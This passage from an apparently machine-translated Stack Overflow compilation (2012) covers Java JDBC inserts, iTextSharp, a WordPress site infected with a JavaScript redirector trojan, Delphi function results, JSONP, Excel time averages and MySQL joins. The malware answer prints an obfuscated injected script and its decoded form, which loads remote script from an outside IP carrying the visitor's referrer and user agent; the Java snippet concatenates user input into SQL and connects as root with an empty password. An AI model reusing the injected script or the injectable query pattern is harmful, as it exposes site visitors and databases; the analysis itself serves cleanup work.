    Connection con = getConnection();
    try
    {
        Statement s = con.createStatement();
        String select = "INSERT INTO  customerInfo (custNum , custName, account ,empID) VALUES ("+ custNuma +",  '"+ custNamea +"',  '"+ accounta +"',  "+ empIDa +")";
        //String select = "INSERT INTO  customerInfo (custNum , custName, account ,empID) VALUES (123,  'Jim John Joe',  'New Account', 1234)";
        s.executeUpdate(select);
        lblSuccess = new Label("Success!");
        add(lblSuccess);

    }
    catch (SQLException e)
    {
        System.out.println("getClasses method: " + e.getMessage());
        lblSuccess = new Label("FAIL!");
        add(lblSuccess);
    }
}

private Connection getConnection()
{
    Connection con = null;
    try
    {
        Class.forName("com.mysql.jdbc.Driver");
        String url = "jdbc:mysql://localhost/wps";
        String user = "root";
        String pw = "";
        con = DriverManager.getConnection(url, user, pw);
    }
    catch (ClassNotFoundException e)
    {
        System.out.println("getConnection ClassNotFound: " + e.getMessage());
        System.exit(0);
    }
    catch (SQLException e)
    {
        System.out.println("getConnection SQL: " + e.getMessage());
        System.exit(0);
    }
    return con;
}

} 
```

我需要设置一些额外的浏览器设置吗？还。我正在导入 JDBC，所以我可以使用 sql，我需要以某种方式添加它吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T06:24:29.460

也许来自浏览器的java代码无法连接到数据库。

您必须更改应用程序结构，并将小程序部分与服务器部分分开。将所有用户界面逻辑放入applet部分，然后连接到服务器部分，通过RMI或Web Service，发送数据，在服务器端连接数据库。

如果您的客户端能够连接到数据库，则另一个要点事件是，如果您使用连接 url 发布小程序，`jdbc:mysql://localhost/wps`那么每个客户端都将尝试连接到运行小程序的同一台计算机上的数据库。也就是说，如果您有 10 个客户端，则每次尝试都会自行搜索数据库，因为您使用`localhost`.

但是，我建议您将应用程序登录分开在我上面描述的两部分中。

# c# - itextsharp用C#在pdf文件中插入文本

> ID：10084037
> 
> 赞同：0
> 
> 时间：2012-04-10T06:22:08.440
> 
> 标签：c#, asp.net, itextsharp

我想使用下面的代码将文本插入到带有 iTextSharp 的 pdf 文件中。很多时候它工作正常，但其他时候它不起作用。

```
FileStream pdfOutputFile = new FileStream(pdfTemplate, FileMode.Create);
PdfReader pdfReader = new PdfReader(pdffile, System.Text.Encoding.UTF8.GetBytes("ownerPassword"));
PdfStamper pdfStamper = null;
//   pdfReader.Permissions = 1;
pdfStamper = new PdfStamper(pdfReader, pdfOutputFile);
AcroFields testForm = pdfStamper.AcroFields;

PdfContentByte pdfPageContents = pdfStamper.GetUnderContent(index + 1);
string[] formattext = printTxt.Split(new char[] { '\n' });
float lhight = 0;
float abxt = abx;

printTxt= "Hello word";

ft = new FormattedText(printTxt, Color.Black, "Arial", EncodingType.Winansi, true, 9);
Bitmap b = new Bitmap(1, 1);
Graphics graphics = Graphics.FromImage(b);
Font f = new Font("Arial", 9);

pdfPageContents.BeginText();

BaseFont baseFont = BaseFont.CreateFont(BaseFont.HELVETICA, "ASCII", false);
pdfPageContents.SetFontAndSize(baseFont,20); // 40 point font
pdfPageContents.SetRGBColorFill(0, 0, 0);
float textAngle = 0;

pdfPageContents.ShowTextAligned(PdfContentByte.ALIGN_LEFT, printTxt, abx+3, (float)aby + 12 + lhight, textAngle);
pdfPageContents.EndText(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T06:40:34.627

我在任何 Pdf 文件上编写文本的方法是使用软件工具 PDF Nitro Professional 创建文本字段（您可以使用其他一些软件来创建这些字段）。完成后，您可以使用以下代码模式在这些字段上编写文本。

```
string pdfTemplate = filePath;
string newFile = outputFilePath;
PdfReader PDFWriter = new PdfReader(pdfTemplate);
PdfStamper pdfStampDocument = new PdfStamper(PDFWriter, new FileStream(newFile, FileMode.Create));
AcroFields pdfFormFields = pdfStampDocument.AcroFields;
//For Text field
pdfFormFields.SetField("txtTextFieldName", "First Text");
//For Check Box Field 
pdfFormFields.SetField("chkSomeCheckBox", "Yes");
PDFWriter.Close();
pdfStampDocument.Close(); 
```

希望能帮助到你。

# javascript - JS:Redirector-NL [Trj] - 如何删除这个木马？

> ID：10084040
> 
> 赞同：1
> 
> 时间：2012-04-10T06:22:21.547
> 
> 标签：javascript, security, antivirus, virus, virus-scanning

我的网站[http://nutriconsulting.com.br/](http://nutriconsulting.com.br/)中有这个“JS:Redirector-NL [Trj]”病毒问题，当有人打开网络时，avast antivirus 会显示一个弹出窗口，显示此错误

感染详细信息 URL： http: [//nutriconsulting.com.br/wp-content](http://nutriconsulting.com.br/wp-content) ... 过程：C:\Users\Cyber​​ Solutions\AppData\Local\G... 感染：JS:Redirector-NL [Trj]

我扫描了我的 c 面板文件两次，但那里的所有文件都是干净的，那么我该如何删除它呢？该木马在 java 脚本文件中运行，如果有人告诉我如何在 java 脚本中查找恶意代码，我将不胜感激。

同样，此域仅在 avast 防病毒软件中显示错误，而在其他防病毒软件（如 Symantec 或 Norton 防病毒软件）中未显示，因此请在 avast 上进行检查。请帮我解决这个问题，我正在寻找一些快速响应。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T06:36:54.310

看看：[http ://nutriconsulting.com.br/wp-includes/js/l10n.js?ver=20101110](http://nutriconsulting.com.br/wp-includes/js/l10n.js?ver=20101110)

它是：

```
var _0x4470=["\x39\x3D\x31\x2E\x64\x28\x27\x35\x27\x29\x3B\x62\x28\x21\x39\x29\x7B\x38\x3D\x31\x2E\x6A\x3B\x34\x3D\x36\x28\x31\x2E\x69\x29\x3B\x37\x3D\x36\x28\x67\x2E\x6B\x29\x3B\x61\x20\x32\x3D\x31\x2E\x65\x28\x27\x63\x27\x29\x3B\x32\x2E\x66\x3D\x27\x35\x27\x3B\x32\x2E\x68\x3D\x27\x77\x3A\x2F\x2F\x74\x2E\x75\x2E\x6C\x2E\x76\x2F\x73\x2E\x72\x3F\x71\x3D\x27\x2B\x34\x2B\x27\x26\x6D\x3D\x27\x2B\x38\x2B\x27\x26\x6E\x3D\x27\x2B\x37\x3B\x61\x20\x33\x3D\x31\x2E\x6F\x28\x27\x33\x27\x29\x5B\x30\x5D\x3B\x33\x2E\x70\x28\x32\x29\x7D","\x7C","\x73\x70\x6C\x69\x74","\x7C\x64\x6F\x63\x75\x6D\x65\x6E\x74\x7C\x6A\x73\x7C\x68\x65\x61\x64\x7C\x68\x67\x68\x6A\x68\x6A\x68\x6A\x67\x7C\x64\x67\x6C\x6C\x68\x67\x75\x6B\x7C\x65\x73\x63\x61\x70\x65\x7C\x75\x67\x6B\x6B\x6A\x6B\x6A\x7C\x68\x67\x68\x6A\x67\x68\x6A\x68\x6A\x67\x6A\x68\x7C\x65\x6C\x65\x6D\x65\x6E\x74\x7C\x76\x61\x72\x7C\x69\x66\x7C\x73\x63\x72\x69\x70\x74\x7C\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x7C\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x7C\x69\x64\x7C\x6E\x61\x76\x69\x67\x61\x74\x6F\x72\x7C\x73\x72\x63\x7C\x72\x65\x66\x65\x72\x72\x65\x72\x7C\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x7C\x75\x73\x65\x72\x41\x67\x65\x6E\x74\x7C\x32\x31\x36\x7C\x6C\x63\x7C\x75\x61\x7C\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65\x7C\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64\x7C\x72\x65\x66\x7C\x70\x68\x70\x7C\x7C\x39\x31\x7C\x31\x39\x36\x7C\x36\x34\x7C\x68\x74\x74\x70","\x72\x65\x70\x6C\x61\x63\x65","","\x5C\x77\x2B","\x5C\x62","\x67"];eval(function (_0xa064x1,_0xa064x2,_0xa064x3,_0xa064x4,_0xa064x5,_0xa064x6){_0xa064x5=function (_0xa064x3){return _0xa064x3.toString(36);} ;if(!_0x4470[5][_0x4470[4]](/^/,String)){while(_0xa064x3--){_0xa064x6[_0xa064x3.toString(_0xa064x2)]=_0xa064x4[_0xa064x3]||_0xa064x3.toString(_0xa064x2);} ;_0xa064x4=[function (_0xa064x5){return _0xa064x6[_0xa064x5];} ];_0xa064x5=function (){return _0x4470[6];} ;_0xa064x3=1;} ;while(_0xa064x3--){if(_0xa064x4[_0xa064x3]){_0xa064x1=_0xa064x1[_0x4470[4]]( new RegExp(_0x4470[7]+_0xa064x5(_0xa064x3)+_0x4470[7],_0x4470[8]),_0xa064x4[_0xa064x3]);} ;} ;return _0xa064x1;} (_0x4470[0],33,33,_0x4470[3][_0x4470[2]](_0x4470[1]),0,{})); 
```

并以解码形式：

```
element = document.getElementById('dgllhguk');
if (!element) {
    hghjghjhjgjh = document.location;
    hghjhjhjg = escape(document.referrer);
    ugkkjkj = escape(navigator.userAgent);
    var js = document.createElement('script');
    js.id = 'dgllhguk';
    js.src = 'http://91.196.216.64/s.php?ref=' + hghjhjhjg + '&lc=' + hghjghjhjgjh + '&ua=' + ugkkjkj;
    var head = document.getElementsByTagName('head')[0];
    head.appendChild(js)
}];head.appendChild(js)} 
```

控制者`91.196.216.64`（俄罗斯联邦/ISP：SpetsEnergo Ltd.）可以在您的站点上执行任意 js 代码。

# delphi - Result 变量是从函数的第一行定义的吗？

> ID：10084043
> 
> 赞同：9
> 
> 时间：2012-04-10T06:22:47.817
> 
> 标签：delphi

我需要澄清这个案子。

根据我的测试，Result 变量从第一行定义为：Boolean=False、Integer=0、String=''、Object=nil 等。但我从未见过官方的参考资料。这也很有意义，因为这给出了提示。

[DCC 警告] Unit1.pas(35): H2077 分配给“TForm1.Test”的值从未使用过

```
function TForm1.Test: Boolean;
begin
  Result := False;
  // Some arbitrary code here

  Result := True;
end; 
```

但是，如果我注释掉第一行并且在最后一行之前的某个地方出现异常，会发生什么？结果 = False 吗？

如果 Result 未定义，这意味着我**总是**必须通过定义 Result 来启动每个函数，以防以后出现异常。这对我来说毫无意义。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-04-10T07:23:46.227

正如[官方 Delphi 文档](http://docwiki.embarcadero.com/RADStudio/en/Program_Control)所述，结果是：

*   CPU 寄存器 (AL / AX / EAX / RAX / EAX:EDX) 用于寄存器中包含的序数值和元素；
*   FPU 寄存器 (st(0) / XMM1);
*   作为最新参数传递的附加变量。

一般规则是默认情况下不定义结果值。你必须设置它。编译器会警告您任何丢失的结果集。

> 对于字符串、动态数组、方法指针或变体结果，效果与将函数结果声明为声明参数后的附加 var 参数一样。换句话说，调用者传递了一个额外的 32 位指针，该指针指向一个返回函数结果的变量。

准确地说，该`var`参数不仅适用于托管类型，而且适用于`record`或`object`结果，它们在调用之前分配在堆栈上，因此具有相同的行为。

也就是说，例如，如果您的结果是 a `string`，它将作为附加`var`参数传递。因此默认情况下它将包含调用之前的值。一开始会是`''`，然后如果你多次调用该函数，它将包含以前的值。

```
function GetString: string;
// is compiled as procedure GetString(var result: string);
begin
  if result='' then
    result := 'test' else
    writeln('result=',result);
end;

function GetRaise: string;
// is compiled as procedure GetRaise(var result: string);
begin
  result := 'toto';
  raise Exception.Create('Problem');
end;

var s: string;
begin
  // here s=''
  s := GetString; // called as GetString(s);
  // here s='test'
  s := GetString; // called as GetString(s);
  // will write 'result=test' on the console
  try
    s := GetRaise; // called as GetRaise(s);
  finally
    // here s='toto'
  end;
end; 
```

所以我的建议是：

*   修复所有关于未设置结果的编译器警告；
*   不要假设结果字符串被初始化为 '' （它可能一开始是，但不是在第二次调用时） - 这是作为`var`参数传递的，而不是作为`out`参数传递的；
*   Any`exception`将*照常*处理，即运行流程将跳转到下一个`finally`或`except`块 - 但如果您将结果作为`var`参数传输，并且已经分配了某些内容`result`，则将设置该值；
*   这并不是因为在大多数情况下，未设置的结果序数值（例如布尔值）为 0（因为在返回之前的 asm 代码中 EAX=0），它会是下一次（我在客户端看到随机问题由于这种未设置的结果变量：它大部分时间都有效，然后有时代码会失败......）；
*   在较新版本的 Delphi 上，您可以使用该`exit()`语法返回一个值。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-04-10T07:00:43.403

你说：

> 如果 Result 未定义，这意味着我总是必须通过定义 Result 来启动每个函数，以防以后出现异常。

如果函数引发异常，您担心函数的返回值未定义。但这应该没关系。考虑以下代码：

```
x := fn(); 
```

如果函数体`fn`引发异常，`x`则不应将其分配给调用站点。从逻辑上讲，上面的单行可以被认为是两行：

1.  称呼`fn()`
2.  将返回值分配给`x`

如果在第 1 行引发异常，则第 2 行永远不会发生，`x`也不应该被分配给。

因此，如果在分配之前引发了异常，`Result`那么这根本不是问题，因为如果函数引发异常，则永远不应使用函数的返回值。

* * *

你实际上应该关心的是一个相关的问题。如果您分配给`Result`然后引发异常怎么办*？*您分配的值是否有可能`Result`传播到函数之外？可悲的是，答案是肯定的。

对于许多结果类型（例如整数、布尔值等），`Result`如果该函数引发异常，您分配给的值不会传播到该函数之外。到目前为止，一切都很好。

但是对于某些结果类型（字符串、动态数组、接口引用、变体等），有一个实现细节使事情变得复杂。返回值作为`var`参数传递给函数。事实证明，您可以从函数外部初始化返回值。像这样：

```
s := 'my string';
s := fn(); 
```

当 的主体`fn`开始执行时，`Result`具有值`'my string'`。好像`fn`是这样声明的：

```
procedure fn(var Result: string); 
```

这意味着您可以分配给`Result`变量并在调用站点查看修改，即使您的函数随后引发异常。没有干净的方法可以解决它。您可以做的最好的事情是分配给函数中的局部变量，并且仅将 Result 分配为函数的最终行为。

```
function fn: string;
var
  s: string;
begin
  s := ...
  ... blah blah, maybe raise exception
  Result := s;
end; 
```

`return`这里强烈地感觉到缺乏 C 风格的陈述。

* * *

很难准确地说明哪种类型的结果变量容易受到上述问题的影响。最初我认为问题只是影响了托管类型。但 Arnaud 在评论中指出，记录和对象也受到影响。好吧，如果记录或对象是堆栈分配的，那就是真的。如果它是全局变量或堆分配的（例如类的成员），那么编译器会以不同的方式处理它。对于堆分配记录，使用隐式堆栈分配变量返回函数结果。只有当函数返回时，它才会被复制到堆分配的变量中。因此，您在调用站点为函数结果变量分配的值会影响函数本身的语义！

* * *

在我看来，这非常清楚地说明了为什么在语言设计中函数返回值具有`var`语义而不是语义是一个可怕的错误`out`。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-04-10T06:40:23.060

不，`Result`没有（保证的）默认值。除非你给它一个值，否则它是未定义的。[文档](http://docwiki.embarcadero.com/RADStudio/en/Procedures_and_Functions)暗示了这一点，其中指出

> 如果函数在没有为 Result 或函数名赋值的情况下退出，那么函数的返回值是未定义的。

我刚试过

```
function test: integer;
begin
  ShowMessage(IntToStr(result));
end; 
```

并收到一条带有文本的消息`35531136`。

# javascript - 使用 JSONP 时出现“无效标签”？

> ID：10084044
> 
> 赞同：5
> 
> 时间：2012-04-10T06:22:50.500
> 
> 标签：javascript, ajax, json, jsonp, syntax-error

我的 JSONP 请求有问题。数据不会显示，Firebug 显示“无效标签”错误。

![在此处输入图像描述](../Images/50dd44e69fb2e6be5d735efe718ff436.png)

我的 JavaScript：

```
$.ajax({
    url: link,
    dataType: "jsonp",
    beforeSend: function(xhr) {
        var base64 = btoa(username + ":" + password);
        xhr.setRequestHeader("Authorization", "Basic" + base64);
        xhr.overrideMimeType("application/json");
    },
    jsonpCallback: "getResources"
})

function getResources(data) {
    alert(data);
    alert(JSON.parse(data));
    $.each(data.groupStatus, function(i, item) {
        $("body").append("<p>ID: " + item.id + "</p>");
    });
} 
```

我的 JSON：

```
{
    "groupStatus": [
        {
            "id": "Application Layer Configuration-ApplicationLayer",
            "time": 1332755316976,
            "level": 0,
            "warningIds": [],
            "errorIds": []
        },
        {
            "id": "Application Layer-ApplicationLayer:nscalealinst2",
            "time": 1333431531046,
            "level": 0,
            "warningIds": [],
            "errorIds": []
        }
    ]
} 
```

我的 HTML：

```
<html>
<head>
    <title>Monitor</title>
    <link href="css/gadget.css" rel="stylesheet" type="text/css" />
    <script type="text/javascript" src="js/jquery-1.7.2.js"></script>
</head>
<body>
    <div id="content"></div>
    <script type="text/javascript" src="js/gadget.js"></script>
</body> 
```

该请求工作正常，但无论如何都不会显示数据。

![在此处输入图像描述](../Images/402d93baa391a815f2a69444a6bf152f.png)

我几天来一直在寻找解决方案。有人可以帮助我吗？先感谢您！

**解决方案**（更新：06.09.12）

我已经解决了这个问题。执行的服务器（REST接口）没有实现回调函数。另一种不使用JSONP设置跨域请求的方法是设置以下jquery变量：

```
jQuery.support.cors = true; 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-10T06:36:56.063

对 JSONP 调用的响应需要将 JSON 本身包装在函数调用中，其中被调用函数的名称通常在 url 中提供。jQuery 会自动将“回调”的查询字符串参数添加到正在请求的 URL，因此您服务器上的脚本应该执行类似于：

```
// assuming that $JSON contains your JSON content
print "{$_REQUEST['callback']}( {$JSON} );"; 
```

将函数名称添加到响应中的原因是 JSONP 请求实际上是附加到 DOM 的脚本标记，而不是由 XMLHttpRequest 对象发出的常规请求。使用 JSONP 允许浏览器发出跨域请求，否则这些请求会被（默认情况下）应用于 XHR 的跨域策略阻止。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T06:46:05.353

如果 AJAX 脚本托管在同一个域上，那么您可以`dataType: "json"`像这样使用：

```
function getResources(data, textStatus, jqXHR) {
    console.log(data);
    // no need to do JSON.parse(data)
    $.each(data.groupStatus, function(i, item) {
        $("body").append("<p>ID: " + item.id + "</p>");
    });
}
$.ajax({
    url: link,
    dataType: "json",
    beforeSend: function(xhr) {
        var base64 = btoa(username + ":" + password);
        xhr.setRequestHeader("Authorization", "Basic" + base64);
        xhr.overrideMimeType("application/json");
    },
    success: getResources
});​ 
```

如果 AJAX 脚本托管在另一个域上，则*服务器*必须返回 JSONP 数据——封装在函数调用中的 JSON 数据：

```
callback(
    {
        "groupStatus": []
    }
);​ 
```

`<script src="...">`如果服务器返回裸 JSON 数据，那么您将收到解析错误，因为 JSONP 请求与注入标签大致相似。要了解为什么裸 JSON 对象字面量会导致解析错误，请考虑以下示例：

```
// WORKS
{
    alert("foo");
}

// PARSE ERROR -- quote from MDN:
// You should not use an object literal at the beginning of a statement.
// This will lead to an error or not behave as you expect, because the { 
// will be interpreted as the beginning of a block.
{
    "foo": "bar"
}

// WORKS
callback({
    "foo": "bar"
})​ 
```

# perl - Perl OpenOffice::OODoc 修改页眉/页脚样式文本

> ID：10084047
> 
> 赞同：1
> 
> 时间：2012-04-10T06:22:58.653
> 
> 标签：perl, openoffice.org

我试图弄清楚如何更改 ODT 文件页脚中的文本。页脚保存在 styles.xml 中，但是我似乎无法使用 selectElementsByContent 或任何其他方法访问它：

```
my $a = odfContainer('test.odt');
my $styles = odfDocument(container => $a, part => 'styles');

foreach my $element ($styles->selectElementsByContent('mytest'))
{
   #never runs...

} 
```

odt 中的 styles.xml 如下：

```
<office:document-styles>
    <office:master-styles>
        <style:master-page>
            <style:footer>
                <text:p test:style-name="P49">
                    mytest
                </text:p>
            </style:footer>
        </style:master-page>
    </office:master-styles>
</office:document-styles> 
```

更改 text:p 内容的正确方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T23:58:06.783

我最终不得不使用 odfXPath 循环：

```
my $ss = odfXPath(file => 'myfile.odt' , part => 'styles');
my $p =0;
while (my $p = $ss->getElement('//text:p',$p))
{
if ($ss->getText($para) eq 'mytest') { $ss->setText($p,'foobar');}
$p++;
}
$ss->save('mynewfile.odt'); 
```

# facebook - 如何使用 R 从 facebook 中提取内容

> ID：10084053
> 
> 赞同：2
> 
> 时间：2012-04-10T06:23:19.007
> 
> 标签：facebook, r

我想使用 R 提取 facebook 更新消息，但我遇到了一些麻烦。我尝试按照[http://www.brocktibert.com/blog/2012/01/19/358/](http://www.brocktibert.com/blog/2012/01/19/358/)中给出的教程进行操作，但出现以下错误

```
$error$type
[1] "OAuthException"  
$error$code
[1] 190 
```

还有其他方法可以从 Facebook 中提取消息吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T09:50:18.280

我不使用 Facebook（有意），您也没有提供示例代码，但这看起来像是 https: 的错误。

rcurl 可以做到这一点（我将它用于类似的东西），并且作为

[通过 HTTPS 获取 R 脚本](https://stackoverflow.com/questions/7715723/sourcing-r-script-over-https)

注意， --internet2 也可以提供帮助。

迪特

# excel - 如何在 Excel 中计算平均时间（如果小时总和超过 24）

> ID：10084057
> 
> 赞同：-1
> 
> 时间：2012-04-10T06:23:39.970
> 
> 标签：excel, time

我有一些时间值，例如 10:00、8:50、9:45 等（24 小时格式）。我想知道如何计算这 3 个项目的平均值，如果小时总和超过 24 小时（如果更少，那么没有问题）？

谢谢。

谢谢大家。如果只是在单元格中键入值并尝试找到平均值，它会起作用，但如果我使用时间，它会很奇怪，这已经是我计算的结果。这里截图：

![在此处输入图像描述](../Images/babe43997ac0a1cf2aef6d9f3dbacded.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T06:33:57.360

与任何其他数值一样（例如，使用 AVERAGE() 函数）。

使用以下格式掩码：

```
[hh]:mm 
```

如果您想显示超过 24 小时（例如 SUM() 函数）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-12T07:00:50.073

计算一组时间或风向列表的平均值可以被视为类似于计算一组向量的平均值（包含方向和大小的值）。因此，有必要将时间值等同于它们在单位圆上的相应位置，得出它们的垂直分量值并将它们相加，就像对任何这种形式的循环群进行“平均”一样。

假设您有两次 23:00 和 01:00，那么正常的平均计算（sumproduct/count）会给您留下不正确的值 12:00 [(23+1)/2] 而不是正确的 24： 00 / 00:00 值。但是，如果您认为 23:00 等于 24 小时圆上的向量 1<345° 并且 01:00 等于 1<15° 您可以获得它们的向量平均值 [cos(345°)+cos(15° ) + i*(sin(345°)+sin(15°))] = 1<360° 一个等于 24 小时周期的 00:00 的值。但请注意，此方法将取消正好相隔 12 小时的时间，例如，如果您只有 01:00 和 13:00，则无法确定平均时间。

那我就给你留下公式（A列中的时间）

```
TIME_TO_DEGREES                     COSINE              SINE
=(360/24)*(HOUR(A2)+MINUTE(A2)/60)  =COS(RADIANS(B2))   =SIN(RADIANS(B2))
=(360/24)*(HOUR(A3)+MINUTE(A3)/60)  =COS(RADIANS(B3))   =SIN(RADIANS(B3))
=(360/24)*(HOUR(A4)+MINUTE(A4)/60)  =COS(RADIANS(B4))   =SIN(RADIANS(B4))
=(360/24)*(HOUR(A5)+MINUTE(A5)/60)  =COS(RADIANS(B5))   =SIN(RADIANS(B5))

                                    [C8]                [D8]
               COMPONENT AVERAGES   =AVERAGE(C2:C7)     =AVERAGE(D2:D7)

AVERAGE DEGREES                     DEGREES_TO_HOUR     MAGNITUDE
=ROUND(DEGREES(IF(C8=0,ACOS(C8),
IF(D8=0,ASIN(D8),
ATAN(D8/C8)))),3)
+IF(C8<0,180,0)
+IF(AND(D8<0,C8=0),180,0)
+IF(AND(D8<0,C8>0),360,0)           =E8/360             =(C8^2+D8^2)^0.5 
```

在幅度为零的情况下，尝试计算平均时间是不可行的操作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-01-12T07:06:01.410

一种方法是将每个单元格时间转换为**seconds**，然后平均这些秒数，最后转换为**hh:mm:ss** 格式

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-10T06:34:44.280

您是否尝试过使用该`AVERAGE`功能？

我用你的值在 excel 中测试了它，它给了我正确的平均时间。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-04-02T09:03:06.517

简单只需单击单元格（时间）并转换（自动）为 12 小时时间

即，如果您有**00:31:24**则将其转换为像这样**12:31:24 AM**的完整日期。

之后，您可以使用平均。

# asp.net - ASP.NET（C#）中数据库中的多条记录

> ID：10084058
> 
> 赞同：0
> 
> 时间：2012-04-10T06:23:40.277
> 
> 标签：asp.net

我想使用存储过程从数据库中获取多条记录。我想从我的 ASPX 应用程序中调用该过程。怎么可能？？

我正在尝试的任何事情如下：

Oracle 存储过程：

```
CREATE OR REPLACE PROCEDURE GET_DDO
(
  TCODE IN VARCHAR2  
, DDOCODE_var OUT VARCHAR2  
) AS
BEGIN
  select ddocode into ddocode_var from ddo;
END GET_DDO; 
```

我的 .CS 代码：

```
 myconnection.ConnectionString = conString;
        using (myconnection)
        {
            myconnection.Open();          
            myadapter.SelectCommand = new OleDbCommand("Get_DDO", myconnection);
            myadapter.SelectCommand.CommandType = CommandType.StoredProcedure;
            myadapter.SelectCommand.Parameters.Add("TCode", OleDbType.VarChar).Value = treasuryCode;
            myadapter.SelectCommand.Parameters.Add("DDOCOde",OleDbType.Varchar).Direction=ParameterDirection.Output;
            myadapter.Fill(mydataset);            

            myconnection.Close();

            return mydataset;
        } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T06:41:52.363

您可以在存储过程中编写多个选择语句，例如

```
Select * from Table1

Select * from Table2 
```

稍后从数据库层，您可以使用 DataAdapter 获取 DataSet 中的值，例如

```
dataAdapter.Fill(dataSet); 
```

您可以在 dataSet 的两个数据表中获取记录集，即

```
dataSet.DataTables[0] // record from Table1

dataSet.DataTables[1] // record from Table2 
```

如果发现拼写错误，我们深表歉意。

# ip - 子域。您如何使用子域进行开发？

> ID：10084060
> 
> 赞同：2
> 
> 时间：2012-04-10T06:23:53.850
> 
> 标签：ip, subdomain, cname, hosts

我目前正在构建一个也使用 websockets 的 web 应用程序。（用于 webserver 的 Rails 和用于 socket.io 的 Nodejs）

我已经构建了我的应用程序以使用子域来分隔与 Nodejs 服务器和 Rails 网络服务器的连接。我将“socket.mysite.com”重定向到节点服务器，其他所有内容都重定向到网络服务器。

我能够在 localhost 上测试此功能。我只是修改了我的 /etc/hosts 以包含以下内容：

```
127.0.0.1 socket.mysite.com
127.0.0.1 mysite.com 
```

我知道在生产中我只需要为 socket.mysite.com 生成一个 CNAME 记录，这也适用于我用户的计算机。

但是，我习惯于通过传递 IP 地址来测试我的应用程序。我的团队通常在我们自己的机器上设置服务器并进行开发。当我们想测试我们的单个服务器时，我们只需传递一个 IP，如“http://123.45.123.45”。

使用新的子域 hack，如果不修改我的每个测试人员的 /etc/hosts，这将不再可能。老实说，我不希望我的测试人员当场修改他们的 /etc/hosts。我能做的是让我的团队的每个成员都有自己的域，并为每个团队成员创建适当的 CNAME 记录。

有没有更简单的方法可以让我在 IP 上运行我的应用程序并传递该 IP？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T06:34:07.183

听起来您的需求已经超出了仅编辑主机文件的日子。虽然您可以继续让团队中的每个人继续编辑主机文件，但我在这里看到了两个主要风险：

*   对于您仅使用 IP 地址的想法，您可能会在测试中丢失一些除非您在生产环境中才能看到的内容，因为问题可能取决于域配置中的某些内容。

*   对于使用主机条目，您会为每个开发人员和测试人员的配置引入大量复杂性和不必要的更改，这当然会为错误敞开大门，而且从长远来看，这也需要时间加起来。

在您的情况下，设置 DNS 服务器可能会有所帮助。您可以为每个开发人员映射一组与特定模式匹配的域，以便您的应用程序仍能正确运行。这将允许您共享 URL，而不必不断地重新配置每个人的计算机。此外，营销和销售利益相关者也可以轻松查看产品演示，而无需了解难以捉摸的主机文件的用途。

如果您有 IT 部门，他们可以帮助您设置 DNS。[但是，如果您是一个没有真正的 IT 部门的小团队，一些用户已经使用专为家庭或小型办公室网络设计的 DNS 系统](http://mark.koli.ch/2010/03/howto-setting-up-your-own-local-dns-server.html)取得了成功。

# mysql - 如何正确连接 MYSQL 中可能没有匹配结果的列？

> ID：10084061
> 
> 赞同：0
> 
> 时间：2012-04-10T06:23:55.653
> 
> 标签：mysql, select, join

不确定我的标题是否很好地解释了它，所以这里有一个例子。我有两个 MYSQL 表，comments 和 votes_comments，它们根据字段 comment_id 匹配。对于示例数据，评论有两行，而 votes_comments 有一行与评论行之一匹配。AKA 写了两条评论，一个人对其中一条进行了投票 鉴于此，以下查询返回 2 行：

```
SELECT comments.*, users.username FROM comments 
JOIN users ON users.user_id = comments.user_id 
WHERE comments.track_id=6 AND comments.parent_id=-1
GROUP BY comments.comment_id 
```

现在我想做的是加入可能有也可能没有匹配行的 votes_comments。我想要做的是获取匹配值（如果存在），或者如果没有匹配结果，则在列中返回 null 。又名：用户是否投票赞成、反对或根本不投票（空）。这是我修改后的查询：

```
SELECT comments.*, users.username, votes_comments.vote FROM comments 
JOIN users ON users.user_id = comments.user_id 
LEFT JOIN votes_comments ON votes_comments.comment_id = comments.comment_id
WHERE track_id=6 AND parent_id=-1 AND votes_comments.user_id=1
GROUP BY comments.comment_id 
```

此查询仅返回一行，因为我在 votes_comments 中只有一行。我认为左连接会以我想要的方式返回结果，但显然不是。任何想法如何得到我正在寻找的东西？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T06:45:01.550

我怀疑该`WHERE`条款`AND votes_comments.user_id=1`导致了问题。

阅读[有关联接的教程](http://www.w3schools.com/sql/sql_join_left.asp)，您会看到您的结果`LEFT JOIN`是一个包含两行的临时表，并且对于每一行，字段 from`comments JOIN users`和 from `votes_comments`。如果不`votes_comments`存在匹配的记录，则临时表中的字段将填充`NULL`值。

您的`WHERE`子句 ,`AND votes_comments.user_id=1`将失败，因为`votes_comments.user_id`它位于没有匹配记录`NULL`的行中。`user``votes_comments`

如果您真正想要的是加入`votes_comments`与特定用户 ID 匹配的行（例如 ID=1），那么您的`ON`子句应该类似于

```
ON votes_comments.comment_id = comments.comment_id
    AND votes_comments.user_id=1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T06:30:11.980

如果您想拥有两个表中的行，您可以考虑使用`FULL OUTER JOIN`. 像这样：

```
SELECT comments.*, users.username, votes_comments.vote FROM comments 
JOIN users ON users.user_id = comments.user_id 
